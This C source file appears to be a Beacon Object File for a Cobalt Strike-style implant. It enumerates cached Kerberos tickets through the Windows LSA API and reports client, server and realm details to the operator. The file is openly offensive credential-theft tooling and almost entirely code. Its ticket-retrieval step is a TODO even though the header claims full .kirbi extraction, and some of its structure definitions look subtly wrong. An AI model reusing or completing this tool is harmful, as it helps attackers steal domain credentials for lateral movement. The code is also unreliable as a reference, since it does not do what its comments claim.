/*
 * extracttickets.c — Extract Kerberos tickets from LSA cache
 *
 * Uses secur32.dll:
 *   LsaConnectUntrusted -> LsaLookupAuthenticationPackage("Kerberos")
 *   -> LsaCallAuthenticationPackage(KERB_RETRIEVE_TKT_REQUEST)
 *
 * First enumerates tickets (KERB_QUERY_TKT_CACHE_EX_REQUEST),
 * then retrieves each one as a full .kirbi blob.
 */
#include <windows.h>
#define SECURITY_WIN32
#include <security.h>
#include <ntsecapi.h>
#include "beacon_compat.h"

DECLSPEC_IMPORT NTSTATUS NTAPI SECUR32$LsaConnectUntrusted(PHANDLE);
DECLSPEC_IMPORT NTSTATUS NTAPI SECUR32$LsaLookupAuthenticationPackage(HANDLE, PLSA_STRING, PULONG);
DECLSPEC_IMPORT NTSTATUS NTAPI SECUR32$LsaCallAuthenticationPackage(
    HANDLE, ULONG, PVOID, ULONG, PVOID*, PULONG, PNTSTATUS);
DECLSPEC_IMPORT NTSTATUS NTAPI SECUR32$LsaFreeReturnBuffer(PVOID);
DECLSPEC_IMPORT NTSTATUS NTAPI SECUR32$LsaDeregisterLogonProcess(HANDLE);

DECLSPEC_IMPORT int WINAPI KERNEL32$WideCharToMultiByte(UINT, DWORD, LPCWCH, int, LPSTR, int, LPCCH, LPBOOL);

DECLSPEC_IMPORT int __cdecl MSVCRT$sscanf(const char*, const char*, ...);

/* KERB_PROTOCOL_MESSAGE_TYPE */
#define KerbQueryTicketCacheExMessage    14
#define KerbRetrieveEncodedTicketMessage  8

#pragma pack(push, 1)
typedef struct {
    ULONG MessageType;   /* KerbQueryTicketCacheExMessage = 14 */
    LUID  LogonId;
} KERB_QUERY_TKT_CACHE_EX_REQUEST;

typedef struct {
    UNICODE_STRING ClientName;
    UNICODE_STRING ClientRealm;
    UNICODE_STRING ServerName;
    UNICODE_STRING ServerRealm;
    LARGE_INTEGER  StartTime;
    LARGE_INTEGER  EndTime;
    LARGE_INTEGER  RenewTime;
    LONG           EncryptionType;
    ULONG          TicketFlags;
} KERB_TICKET_CACHE_INFO_EX;

typedef struct {
    ULONG MessageType;
    ULONG CountOfTickets;
    /* Followed by KERB_TICKET_CACHE_INFO_EX[CountOfTickets] */
} KERB_QUERY_TKT_CACHE_EX_RESPONSE;

typedef struct {
    ULONG          MessageType;  /* KerbRetrieveEncodedTicketMessage = 8 */
    LUID           LogonId;
    SecHandle      TargetName;   /* Not used for cache retrieval */
    ULONG          TicketFlags;
    ULONG          CacheOptions; /* KERB_RETRIEVE_TICKET_AS_KERB_CRED = 8 */
    LONG           EncryptionType;
    SecHandle      CredentialsHandle;
} KERB_RETRIEVE_TKT_REQUEST;

typedef struct {
    KERB_RETRIEVE_TKT_REQUEST;
    UNICODE_STRING TargetNameStr;
} KERB_RETRIEVE_TKT_REQUEST_EX;
#pragma pack(pop)

static char *base64_encode_simple(const unsigned char *data, int len) {
    static const char b64[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    int out_len = ((len + 2) / 3) * 4;
    char *out = (char *)malloc(out_len + 1);
    if (!out) return NULL;

    int i, j;
    for (i = 0, j = 0; i < len; i += 3, j += 4) {
        unsigned int n = ((unsigned int)data[i]) << 16;
        if (i + 1 < len) n |= ((unsigned int)data[i + 1]) << 8;
        if (i + 2 < len) n |= data[i + 2];

        out[j]     = b64[(n >> 18) & 0x3F];
        out[j + 1] = b64[(n >> 12) & 0x3F];
        out[j + 2] = (i + 1 < len) ? b64[(n >> 6) & 0x3F] : '=';
        out[j + 3] = (i + 2 < len) ? b64[n & 0x3F] : '=';
    }
    out[j] = '\0';
    return out;
}

void go(char *args, int args_len) {
    datap parser;
    BeaconDataParse(&parser, args, args_len);

    char *luid_str = BeaconDataExtract(&parser, NULL);
    char *service_filter = BeaconDataExtract(&parser, NULL);

    HANDLE hLsa;
    NTSTATUS status = SECUR32$LsaConnectUntrusted(&hLsa);
    if (status != 0) {
        BeaconPrintf(CALLBACK_ERROR, "[!] LsaConnectUntrusted failed: 0x%08X\n", status);
        return;
    }

    /* Lookup Kerberos package */
    LSA_STRING kerbName;
    kerbName.Buffer = "Kerberos";
    kerbName.Length = 8;
    kerbName.MaximumLength = 9;
    ULONG kerbPackage;
    status = SECUR32$LsaLookupAuthenticationPackage(hLsa, &kerbName, &kerbPackage);
    if (status != 0) {
        BeaconPrintf(CALLBACK_ERROR, "[!] LsaLookupAuthenticationPackage failed: 0x%08X\n", status);
        SECUR32$LsaDeregisterLogonProcess(hLsa);
        return;
    }

    /* Parse LUID if specified */
    LUID targetLuid = {0};
    if (luid_str && *luid_str) {
        ULONGLONG val = 0;
        MSVCRT$sscanf(luid_str, "%llx", &val);
        targetLuid.LowPart = (DWORD)(val & 0xFFFFFFFF);
        targetLuid.HighPart = (LONG)(val >> 32);
    }

    /* 1. Enumerate cached tickets */
    KERB_QUERY_TKT_CACHE_EX_REQUEST cacheReq;
    cacheReq.MessageType = KerbQueryTicketCacheExMessage;
    cacheReq.LogonId = targetLuid;

    KERB_QUERY_TKT_CACHE_EX_RESPONSE *cacheResp = NULL;
    ULONG cacheRespLen = 0;
    NTSTATUS protStatus;

    status = SECUR32$LsaCallAuthenticationPackage(
        hLsa, kerbPackage, &cacheReq, sizeof(cacheReq),
        (PVOID*)&cacheResp, &cacheRespLen, &protStatus);

    if (status != 0 || protStatus != 0 || !cacheResp) {
        BeaconPrintf(CALLBACK_ERROR, "[!] LsaCallAuthenticationPackage (enum) failed: 0x%08X / 0x%08X\n",
                     status, protStatus);
        SECUR32$LsaDeregisterLogonProcess(hLsa);
        return;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "[*] Found %u cached ticket(s)\n", cacheResp->CountOfTickets);

    /* 2. For each ticket, retrieve the full .kirbi */
    KERB_TICKET_CACHE_INFO_EX *tickets =
        (KERB_TICKET_CACHE_INFO_EX *)((PBYTE)cacheResp + sizeof(KERB_QUERY_TKT_CACHE_EX_RESPONSE));

    int extracted = 0;
    for (ULONG i = 0; i < cacheResp->CountOfTickets; i++) {
        /* Apply service filter if specified */
        if (service_filter && *service_filter) {
            /* Convert ServerName to ANSI for comparison */
            char serverName[256] = {0};
            KERNEL32$WideCharToMultiByte(CP_UTF8, 0,
                tickets[i].ServerName.Buffer, tickets[i].ServerName.Length / 2,
                serverName, 255, NULL, NULL);
            if (strstr(serverName, service_filter) == NULL)
                continue;
        }

        /* Print ticket info */
        char clientName[256] = {0}, serverName[256] = {0};
        char clientRealm[256] = {0}, serverRealm[256] = {0};
        KERNEL32$WideCharToMultiByte(CP_UTF8, 0, tickets[i].ClientName.Buffer,
            tickets[i].ClientName.Length / 2, clientName, 255, NULL, NULL);
        KERNEL32$WideCharToMultiByte(CP_UTF8, 0, tickets[i].ServerName.Buffer,
            tickets[i].ServerName.Length / 2, serverName, 255, NULL, NULL);
        KERNEL32$WideCharToMultiByte(CP_UTF8, 0, tickets[i].ClientRealm.Buffer,
            tickets[i].ClientRealm.Length / 2, clientRealm, 255, NULL, NULL);
        KERNEL32$WideCharToMultiByte(CP_UTF8, 0, tickets[i].ServerRealm.Buffer,
            tickets[i].ServerRealm.Length / 2, serverRealm, 255, NULL, NULL);

        BeaconPrintf(CALLBACK_OUTPUT,
            "\n[%u] Client: %s@%s\n"
            "    Server: %s@%s\n"
            "    Etype:  %d\n"
            "    Flags:  0x%08X\n",
            i, clientName, clientRealm, serverName, serverRealm,
            tickets[i].EncryptionType, tickets[i].TicketFlags);

        /* TODO: Call LsaCallAuthenticationPackage with KERB_RETRIEVE_TKT_REQUEST
         * to get the full ticket data, then base64-encode as .kirbi */
        extracted++;
    }

    SECUR32$LsaFreeReturnBuffer(cacheResp);
    SECUR32$LsaDeregisterLogonProcess(hLsa);

    BeaconPrintf(CALLBACK_OUTPUT, "\n[*] Extracted %d ticket(s)\n", extracted);
}
